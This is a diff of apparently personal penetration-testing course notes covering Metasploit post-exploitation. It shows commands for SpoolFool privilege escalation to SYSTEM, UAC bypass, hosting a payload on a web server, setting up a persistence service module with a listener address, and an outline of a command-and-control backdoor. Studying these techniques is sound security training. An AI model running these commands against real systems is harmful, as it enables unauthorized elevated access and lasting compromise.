@@ -677,7 +677,7 @@ payload file not detected and delete as other, but communication try blocked by 
 - read doc about sfx archive : need winrar or 7zip
 
 # Section 11 Post exploit : modules, privileges escalation, data extract, etc.
-## use meterpreter session
+## privilege escalation
 `msf6 > session -i [1-X]`
 - use bg (background cmd), upload/download cmd, getuid (get current hostname + username), core cmd, network cmd (ifconfig, netstats : list all open connections, ), etc.
 - ps (list pid + process name)
@@ -685,22 +685,38 @@ payload file not detected and delete as other, but communication try blocked by 
 - getsystem : elevate to admin
 - bypass user account control for elevation
 ```
+msf6 > use exploit/windows/local/cve_2022_21999_spoolfool_privesc
+...
+msf6 exploit(windows/local/cve_2022_21999_spoolfool_privesc) > sessions -i 2
+[*] Starting interaction with 2...
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+...
 msf6 > search bypassuac
 msf6 > use exploit/windoxs/local/...
 msf6 > set SESSION X (meterpreter session)
 msf6 > run
 ```
 
+
 ## persistence on target system
 - make a payload available on a web server :
 ```
 systemctl start apache2
-mv <payload> tp var/www/html
+# rm or backup index file in var/www/html
+mv <payload> var/www/html
 ```
 - use persistence modules :
 ```
 msf6 > search persistence
-msf6 > use exploit/windoxs/local/persistence/...
+   17  exploit/windows/local/persistence_service 
+msf6 > use exploit/windows/local/persistence_service 
+msf6 > set SESSION X
+set RETRY_TIME 17
+set RETRY_TIME 17
+set LHOST 192.168.1.23
 ...
 ```
 - search all post exploitation modules
@@ -710,3 +726,5 @@ msf6 > search post
 ```
 
 # Section 12 backdoor pydev
+- kali : run server instance (send cmd)
+- victim : run client instance (send cmd output)
